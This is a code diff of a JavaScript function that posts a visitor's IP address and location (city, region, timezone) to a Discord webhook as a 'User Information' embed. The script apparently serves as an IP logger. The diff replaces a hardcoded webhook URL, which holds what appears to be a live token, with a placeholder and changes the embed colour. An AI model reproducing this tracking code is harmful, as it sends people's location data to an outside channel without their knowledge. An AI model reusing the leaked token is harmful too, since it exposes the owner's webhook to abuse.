@@ -25,13 +25,13 @@
   // Function to send data to Discord webhook as an embedded message
   async function sendToDiscord(ipAddress, locationInfo) {
     const { city, region, timezone } = locationInfo;
-    const webhookURL = 'https://discord.com/api/webhooks/1197319022455300147/hnBvBYUy-eHX9vSz8S_-jMFtQ805c7pUcoQqkLB6ZSCzE_h87CHjMPrMy6aqNXFdT_P7'; // Replace with your Discord webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'; // Replace with your Discord webhook URL
 
-    // Create payload for Discord webhook as an embedded message
+    // Create payload for Discord webhook as an embedded message with color #2b2d31
     const payload = {
         embeds: [{
             title: "User Information",
-            color: 0x3498db, // Set the color of the embed (Hex color code)
+            color: 0x2b2d31, // Set the color of the embed (Hex color code)
             fields: [
                 { name: "City", value: city, inline: true },
                 { name: "Region", value: region, inline: true },
